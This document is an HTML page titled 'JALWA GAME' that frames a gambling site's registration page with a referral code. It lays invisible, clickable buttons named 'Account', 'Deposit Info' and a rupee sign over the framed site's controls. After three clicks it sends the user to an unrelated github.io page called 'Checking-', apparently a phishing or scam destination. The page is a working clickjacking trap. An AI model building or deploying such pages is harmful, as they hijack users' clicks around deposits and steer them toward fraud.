<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>JALWA GAME</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      font-family: 'Segoe UI', Roboto, sans-serif;
    }

    #frame-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    #website-iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Common transparent style */
    .fully-transparent {
      opacity: 0;
      background: transparent;
      border: none;
      color: transparent;
      pointer-events: auto; /* Still clickable */
      position: fixed;
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }

    #first-button {
      width: 80px;
      height: 88px;
      right: 20px;
      bottom: 20px;
    }

    #second-button {
      width: 120px;
      height: 340px;
      left: 110px;
      top: 0;
      display: none;
      clip-path: polygon(
        0% 0%, 100% 0%, 100% 20%, 80% 20%, 80% 30%, 100% 30%,
        100% 100%, 0% 100%, 0% 67%, 20% 67%, 20% 55%, 0% 55%, 0% 0%
      );
    }

    #third-button {
      width: 150px;
      height: 55px;
      right: 20px;
      bottom: 20px;
      display: none;
    }
  </style>
</head>
<body>
  <div id="frame-container">
    <iframe 
      id="website-iframe"
      src="https://www.jalwagame.win/#/register?invitationCode=57357202283"
      allow="fullscreen *"
      loading="eager">
    </iframe>
  </div>

  <!-- Fully Transparent Buttons -->
  <button id="first-button" class="fully-transparent">Account</button>
  <button id="second-button" class="fully-transparent">Deposit Info</button>
  <button id="third-button" class="fully-transparent">â‚¹</button>

  <script>
    const firstButton = document.getElementById('first-button');
    const secondButton = document.getElementById('second-button');
    const thirdButton = document.getElementById('third-button');

    firstButton.addEventListener('click', () => {
      firstButton.style.display = 'none';
      secondButton.style.display = 'flex';
    });

    secondButton.addEventListener('click', () => {
      secondButton.style.display = 'none';
      thirdButton.style.display = 'flex';
    });

    thirdButton.addEventListener('click', () => {
      window.location.href = 'https://g1backk.github.io/Checking-/';
    });
  </script>
</body>
</html>
